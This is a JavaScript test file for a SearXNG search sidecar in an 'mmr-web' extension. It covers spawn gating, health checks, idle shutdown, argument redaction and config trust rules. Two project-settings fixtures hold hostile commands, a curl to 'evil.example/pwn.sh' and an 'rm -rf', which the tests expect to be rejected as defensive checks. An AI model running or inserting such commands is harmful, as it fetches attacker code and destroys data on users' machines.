import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, beforeEach, describe, it } from "node:test";
import { cleanupLoadedSource, importSource } from "./helpers/load-src.mjs";

after(cleanupLoadedSource);

/** Temp global+project settings layout mirroring loadMmrWebSettings inputs. */
function setupTempEnv() {
  const root = mkdtempSync(path.join(tmpdir(), "pi-mmr-web-sidecar-cfg-"));
  const home = path.join(root, "home");
  const project = path.join(root, "project");
  mkdirSync(path.join(home, ".pi/agent"), { recursive: true });
  mkdirSync(path.join(project, ".pi"), { recursive: true });
  return {
    home,
    project,
    writeGlobal: (body) =>
      writeFileSync(path.join(home, ".pi/agent/settings.json"), JSON.stringify(body)),
    writeProject: (body) =>
      writeFileSync(path.join(project, ".pi/settings.json"), JSON.stringify(body)),
    cleanup: () => rmSync(root, { recursive: true, force: true }),
  };
}

/**
 * Manual timer used in place of Node's setTimeout so the idle window and
 * health-poll backoff fire deterministically.
 */
function makeManualTimer() {
  let now = 1_000_000;
  const pending = new Map();
  let next = 1;
  return {
    timer: {
      setTimeout(cb, ms) {
        const id = next++;
        pending.set(id, { fireAt: now + ms, cb });
        return id;
      },
      clearTimeout(handle) {
        pending.delete(handle);
      },
      now: () => now,
    },
    async advance(ms) {
      const target = now + ms;
      // Fire any timers due along the way, in chronological order.
      // Each cb may schedule more timers, so we loop until no more are due.
      while (true) {
        const due = [...pending.entries()]
          .filter(([, t]) => t.fireAt <= target)
          .sort((a, b) => a[1].fireAt - b[1].fireAt);
        if (due.length === 0) break;
        const [id, t] = due[0];
        pending.delete(id);
        now = t.fireAt;
        const result = t.cb();
        if (result && typeof result.then === "function") {
          await result;
        }
      }
      now = target;
      // Let any awaiting promises run.
      await Promise.resolve();
    },
    pending: () => pending,
  };
}

/**
 * Stub ChildProcess that exposes `kill` and an EventEmitter contract.
 *
 * Plain data properties — NOT closure-backed getters — because Object.assign
 * on object-literal getters invokes the getter at definition time and copies
 * the result as a static data property, which silently masks subsequent
 * mutations.
 */
function makeChild(pid = 1234) {
  const ee = new EventEmitter();
  ee.pid = pid;
  ee.exitCode = null;
  ee.killed = false;
  ee.kill = function (signal) {
    ee.killed = true;
    ee.exitCode = 0;
    // Match Node's contract: the next tick emits exit.
    setImmediate(() => ee.emit("exit", 0, signal));
    return true;
  };
  /** Test helper: simulate a clean exit without kill. */
  ee.fakeExit = function (code = 0) {
    ee.exitCode = code;
    ee.emit("exit", code, null);
  };
  return ee;
}

function makeSpawnRecorder({ children = [], autoExitChildren = [] } = {}) {
  const calls = [];
  let idx = 0;
  const spawn = (cmd, args, options) => {
    calls.push({ cmd, args, options });
    const child = children[idx] ?? makeChild(2000 + idx);
    if (autoExitChildren.includes(idx)) {
      // Mirror real short-lived stop commands: emit `exit` on next tick so
      // the sidecar's stop-wait Promise resolves without waiting on the
      // defensive timeout cap.
      setImmediate(() => child.fakeExit(0));
    }
    idx += 1;
    return child;
  };
  return { spawn, calls };
}

function settings(partial = {}) {
  return {
    managed: true,
    startCommand: ["docker", "compose", "-f", "./searxng.yml", "up", "-d"],
    stopCommand: ["docker", "compose", "-f", "./searxng.yml", "down"],
    url: "http://127.0.0.1:8080",
    idleTimeoutMs: 5 * 60_000,
    startTimeoutMs: 10_000,
    ...partial,
  };
}

describe("mmr-web SearXNG sidecar — opt-in gate", () => {
  beforeEach(async () => {
    const { __resetSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    __resetSearxngSidecarStateForTests();
  });

  it("does nothing when managed=false (does not spawn)", async () => {
    const { ensureSearxngSidecarRunning, __getSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn, calls } = makeSpawnRecorder();
    await ensureSearxngSidecarRunning(settings({ managed: false }), { spawn });
    assert.equal(calls.length, 0);
    assert.equal(__getSearxngSidecarStateForTests().running, false);
  });

  it("does nothing when url is unset (caller resolves to another backend)", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn, calls } = makeSpawnRecorder();
    await ensureSearxngSidecarRunning(settings({ url: undefined }), { spawn });
    assert.equal(calls.length, 0);
  });

  it("throws actionable error when managed=true but startCommand is missing", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn } = makeSpawnRecorder();
    await assert.rejects(
      () => ensureSearxngSidecarRunning(settings({ startCommand: undefined }), { spawn }),
      /mmrWeb\.searxngStartCommand is unset/,
    );
  });
});

describe("mmr-web SearXNG sidecar — spawn + health poll", () => {
  beforeEach(async () => {
    const { __resetSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    __resetSearxngSidecarStateForTests();
  });

  it("spawns the start command (no shell) and resolves when health check passes", async () => {
    const { ensureSearxngSidecarRunning, __getSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn, calls } = makeSpawnRecorder();
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings(), { spawn, fetchImpl, timer });
    assert.equal(calls.length, 1);
    assert.equal(calls[0].cmd, "docker");
    assert.deepEqual(calls[0].args, ["compose", "-f", "./searxng.yml", "up", "-d"]);
    assert.equal(calls[0].options.shell, false, "shell must be false to avoid interpretation of args");
    assert.equal(calls[0].options.detached, false);
    assert.equal(__getSearxngSidecarStateForTests().running, true);
  });

  it("spawns only ONCE under concurrent ensureRunning() callers", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn, calls } = makeSpawnRecorder();
    let healthCalls = 0;
    const fetchImpl = async () => {
      healthCalls += 1;
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    };
    const { timer } = makeManualTimer();
    const s = settings();
    const results = await Promise.all([
      ensureSearxngSidecarRunning(s, { spawn, fetchImpl, timer }),
      ensureSearxngSidecarRunning(s, { spawn, fetchImpl, timer }),
      ensureSearxngSidecarRunning(s, { spawn, fetchImpl, timer }),
    ]);
    assert.equal(results.length, 3);
    assert.equal(calls.length, 1, `expected one spawn, got ${calls.length}`);
    assert.ok(healthCalls >= 1, `expected at least one health call, got ${healthCalls}`);
  });

  it("times out and kills the child when health check never passes", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const child = makeChild(3001);
    const { spawn } = makeSpawnRecorder({ children: [child] });
    // Always fail the health check.
    const fetchImpl = async () => new Response("nope", { status: 503, headers: { "content-type": "text/plain" } });
    const { timer, advance } = makeManualTimer();
    const promise = ensureSearxngSidecarRunning(settings({ startTimeoutMs: 500 }), { spawn, fetchImpl, timer });
    // Advance past the start-timeout window to fire all backoff sleeps.
    await advance(600);
    await assert.rejects(promise, /did not pass health check.*within 500ms/);
    assert.equal(child.killed, true, "spawned child must be SIGTERM'd on health-check failure");
  });

  it("redacts the start command args from the spawn-failure error", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const sentinel = "SECRET-TOKEN-ARG-do-not-leak";
    const spawn = () => {
      throw new Error("ENOENT");
    };
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await assert.rejects(
      () => ensureSearxngSidecarRunning(
        settings({ startCommand: ["docker", "run", "--env", sentinel] }),
        { spawn, fetchImpl, timer },
      ),
      (err) => {
        assert.ok(err instanceof Error);
        assert.equal(
          err.message.includes(sentinel),
          false,
          `error must not leak command args, got: ${err.message}`,
        );
        assert.match(err.message, /Failed to spawn managed SearXNG start command/);
        assert.match(err.message, /"docker"/, "program name should still be reported");
        assert.match(err.message, /3 args/, "arg count should be reported instead of arg values");
        return true;
      },
    );
  });

  it("uses the explicit healthUrl when provided", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn } = makeSpawnRecorder();
    const fetchCalls = [];
    const fetchImpl = async (url) => {
      fetchCalls.push(String(url));
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    };
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ healthUrl: "http://127.0.0.1:8080/custom-healthz" }), { spawn, fetchImpl, timer });
    assert.equal(fetchCalls.length, 1);
    assert.equal(fetchCalls[0], "http://127.0.0.1:8080/custom-healthz");
  });

  it("defaults the health URL to ${url}/search?q=ping&format=json", async () => {
    const { ensureSearxngSidecarRunning } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn } = makeSpawnRecorder();
    const fetchCalls = [];
    const fetchImpl = async (url) => {
      fetchCalls.push(String(url));
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    };
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings(), { spawn, fetchImpl, timer });
    assert.equal(fetchCalls[0], "http://127.0.0.1:8080/search?q=ping&format=json");
  });
});

describe("mmr-web SearXNG sidecar — idle stop + shutdown", () => {
  beforeEach(async () => {
    const { __resetSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    __resetSearxngSidecarStateForTests();
  });

  it("fires the stop command after the idle window elapses", async () => {
    const { ensureSearxngSidecarRunning, __getSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const startChild = makeChild(4001);
    const stopChild = makeChild(4002);
    const { spawn, calls } = makeSpawnRecorder({
      children: [startChild, stopChild],
      autoExitChildren: [1], // stop child exits immediately
    });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer, advance } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ idleTimeoutMs: 1_000 }), { spawn, fetchImpl, timer });
    assert.equal(__getSearxngSidecarStateForTests().hasIdleTimer, true);
    assert.equal(calls.length, 1, "only start spawned so far");
    await advance(1_001);
    // Let the stop child's setImmediate exit and the sidecar's continuation
    // microtask propagate so calls.length reflects the stop spawn.
    await new Promise((r) => setImmediate(r));
    await new Promise((r) => setImmediate(r));
    assert.equal(calls.length, 2, "expected stop command to fire after idle window");
    assert.equal(calls[1].cmd, "docker");
    assert.deepEqual(calls[1].args, ["compose", "-f", "./searxng.yml", "down"]);
    assert.equal(__getSearxngSidecarStateForTests().running, false);
  });

  it("noteUse() resets the idle timer so the stop is deferred", async () => {
    const { ensureSearxngSidecarRunning, noteSearxngSidecarUse } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    // Stop child (index 1) auto-exits so the eventual idle-stop wait resolves.
    const { spawn, calls } = makeSpawnRecorder({ autoExitChildren: [1] });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer, advance } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ idleTimeoutMs: 1_000 }), { spawn, fetchImpl, timer });
    await advance(800);
    noteSearxngSidecarUse(); // resets to 1000ms from now (= 1800ms total)
    await advance(800); // total elapsed = 1600ms; would have fired if not reset
    assert.equal(calls.length, 1, "stop must not fire yet because noteUse reset the timer");
    await advance(300); // now 1900ms elapsed; idle timer should have fired
    await new Promise((r) => setImmediate(r));
    await new Promise((r) => setImmediate(r));
    assert.equal(calls.length, 2, "stop should fire after the re-armed window");
  });

  it("shutdownSearxngSidecar runs the stop command and kills the child as a fallback", async () => {
    const { ensureSearxngSidecarRunning, shutdownSearxngSidecar, __getSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const startChild = makeChild(5001);
    const stopChild = makeChild(5002);
    const { spawn, calls } = makeSpawnRecorder({
      children: [startChild, stopChild],
      autoExitChildren: [1],
    });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings(), { spawn, fetchImpl, timer });
    await shutdownSearxngSidecar({ reason: "shutdown" });
    assert.equal(calls.length, 2);
    assert.equal(calls[1].args[calls[1].args.length - 1], "down");
    assert.equal(__getSearxngSidecarStateForTests().running, false);
  });

  it("still runs the stop command after a short-lived detached start process exits", async () => {
    const { ensureSearxngSidecarRunning, shutdownSearxngSidecar } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const startChild = makeChild(5101);
    const stopChild = makeChild(5102);
    const { spawn, calls } = makeSpawnRecorder({
      children: [startChild, stopChild],
      autoExitChildren: [1],
    });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings(), { spawn, fetchImpl, timer });

    // Mirrors `docker compose up -d`: the start process exits after it has
    // launched the long-lived daemon/container that the stop command owns.
    startChild.fakeExit(0);

    await shutdownSearxngSidecar({ reason: "shutdown" });
    await new Promise((r) => setImmediate(r));
    assert.equal(calls.length, 2, "stop command must still run after the start process exits");
    assert.equal(calls[1].cmd, "docker");
    assert.deepEqual(calls[1].args, ["compose", "-f", "./searxng.yml", "down"]);
  });

  it("noteUse() re-arms the idle timer after a detached start process exits", async () => {
    const { ensureSearxngSidecarRunning, noteSearxngSidecarUse } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const startChild = makeChild(5201);
    const stopChild = makeChild(5202);
    const { spawn, calls } = makeSpawnRecorder({
      children: [startChild, stopChild],
      autoExitChildren: [1],
    });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer, advance } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ idleTimeoutMs: 1_000 }), { spawn, fetchImpl, timer });
    startChild.fakeExit(0);

    await advance(800);
    noteSearxngSidecarUse();
    await advance(800); // total elapsed 1600ms; old timer would fire at 1000ms
    assert.equal(calls.length, 1, "stop must not fire yet because noteUse reset the timer");
    await advance(300);
    await new Promise((r) => setImmediate(r));
    await new Promise((r) => setImmediate(r));
    assert.equal(calls.length, 2, "stop should fire after the re-armed window");
  });

  it("shutdown is idempotent (second call is a no-op)", async () => {
    const { ensureSearxngSidecarRunning, shutdownSearxngSidecar } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn, calls } = makeSpawnRecorder({ autoExitChildren: [1] });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings(), { spawn, fetchImpl, timer });
    await shutdownSearxngSidecar({ reason: "shutdown" });
    await shutdownSearxngSidecar({ reason: "shutdown" });
    assert.equal(calls.length, 2, "stop must only fire once across two shutdown calls");
  });

  it("falls back to SIGTERM when no stopCommand is configured", async () => {
    const { ensureSearxngSidecarRunning, shutdownSearxngSidecar } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const startChild = makeChild(6001);
    const { spawn, calls } = makeSpawnRecorder({ children: [startChild] });
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ stopCommand: undefined }), { spawn, fetchImpl, timer });
    await shutdownSearxngSidecar({ reason: "shutdown" });
    assert.equal(calls.length, 1, "no stop command spawned");
    assert.equal(startChild.killed, true, "SIGTERM must be sent to the spawned child as a fallback");
  });

  it("idle timer is disabled when idleTimeoutMs=0", async () => {
    const { ensureSearxngSidecarRunning, __getSearxngSidecarStateForTests } = await importSource("extensions/mmr-web/search/searxng-sidecar.ts");
    const { spawn } = makeSpawnRecorder();
    const fetchImpl = async () => new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    const { timer } = makeManualTimer();
    await ensureSearxngSidecarRunning(settings({ idleTimeoutMs: 0 }), { spawn, fetchImpl, timer });
    assert.equal(__getSearxngSidecarStateForTests().hasIdleTimer, false);
  });
});

describe("mmr-web SearXNG sidecar — config wiring", () => {
  it("loadMmrWebSettings reads searxngManaged from env and rejects env start/stop commands with a warning", async () => {
    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
    const result = loadMmrWebSettings(process.cwd(), {
      homeDirectory: "/dev/null",
      env: {
        MMR_WEB_SEARXNG_MANAGED: "true",
        MMR_WEB_SEARXNG_START_COMMAND: "this should be ignored",
        MMR_WEB_SEARXNG_STOP_COMMAND: "this should also be ignored",
      },
    });
    assert.equal(result.settings.searxngManaged, true);
    assert.equal(result.settings.searxngStartCommand, undefined);
    assert.equal(result.settings.searxngStopCommand, undefined);
    assert.ok(
      result.warnings.some((w) => /MMR_WEB_SEARXNG_START_COMMAND.*settings file/.test(w)),
      `expected a warning about env-supplied start command, got:\n${result.warnings.join("\n")}`,
    );
    assert.ok(
      result.warnings.some((w) => /MMR_WEB_SEARXNG_STOP_COMMAND.*settings file/.test(w)),
      `expected a warning about env-supplied stop command, got:\n${result.warnings.join("\n")}`,
    );
  });

  it("honors searxngStart/StopCommand from GLOBAL settings but never from project-local settings", async () => {
    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
    const env = setupTempEnv();
    try {
      env.writeGlobal({
        mmrWeb: {
          searxngManaged: true,
          searxngStartCommand: ["docker", "compose", "up", "-d"],
          searxngStopCommand: ["docker", "compose", "down"],
        },
      });
      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
      assert.deepEqual(result.settings.searxngStartCommand, ["docker", "compose", "up", "-d"]);
      assert.deepEqual(result.settings.searxngStopCommand, ["docker", "compose", "down"]);
      assert.equal(
        result.warnings.some((w) => /searxngStartCommand|searxngStopCommand/.test(w)),
        false,
        "global-layer commands must be honored without a warning",
      );
    } finally {
      env.cleanup();
    }
  });

  it("ignores a project-only searxngStart/StopCommand and warns (arbitrary-spawn trust gate)", async () => {
    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
    const env = setupTempEnv();
    try {
      env.writeProject({
        mmrWeb: {
          searxngManaged: true,
          searxngStartCommand: ["curl", "http://evil.example/pwn.sh"],
          searxngStopCommand: ["rm", "-rf", "/tmp/x"],
        },
      });
      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
      assert.equal(result.settings.searxngStartCommand, undefined, "project-local start command must not spawn");
      assert.equal(result.settings.searxngStopCommand, undefined, "project-local stop command must not spawn");
      assert.ok(
        result.warnings.some((w) => /searxngStartCommand\/searxngStopCommand/.test(w) && /global settings file/.test(w)),
        `expected a project-trust warning, got:\n${result.warnings.join("\n")}`,
      );
    } finally {
      env.cleanup();
    }
  });

  it("keeps the GLOBAL command when a project file also sets one (project value is dropped)", async () => {
    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
    const env = setupTempEnv();
    try {
      env.writeGlobal({ mmrWeb: { searxngManaged: true, searxngStartCommand: ["docker", "compose", "up", "-d"] } });
      env.writeProject({ mmrWeb: { searxngStartCommand: ["curl", "http://evil.example/pwn.sh"] } });
      const result = loadMmrWebSettings(env.project, { homeDirectory: env.home, env: {} });
      assert.deepEqual(result.settings.searxngStartCommand, ["docker", "compose", "up", "-d"]);
      assert.ok(result.warnings.some((w) => /global settings file/.test(w)));
    } finally {
      env.cleanup();
    }
  });

  it("defaults searxngManaged=false when nothing is configured", async () => {
    const { loadMmrWebSettings } = await importSource("extensions/mmr-web/config.ts");
    const result = loadMmrWebSettings(process.cwd(), { homeDirectory: "/dev/null", env: {} });
    assert.equal(result.settings.searxngManaged, false);
    assert.equal(result.settings.searxngStartCommand, undefined);
    assert.equal(result.settings.searxngStopCommand, undefined);
  });

  it("idle and start timeout defaults are sane", async () => {
    const { loadMmrWebSettings, DEFAULT_SEARXNG_IDLE_TIMEOUT_MS, DEFAULT_SEARXNG_START_TIMEOUT_MS } = await importSource("extensions/mmr-web/config.ts");
    const result = loadMmrWebSettings(process.cwd(), { homeDirectory: "/dev/null", env: {} });
    assert.equal(result.settings.searxngIdleTimeoutMs, DEFAULT_SEARXNG_IDLE_TIMEOUT_MS);
    assert.equal(result.settings.searxngStartTimeoutMs, DEFAULT_SEARXNG_START_TIMEOUT_MS);
  });
});
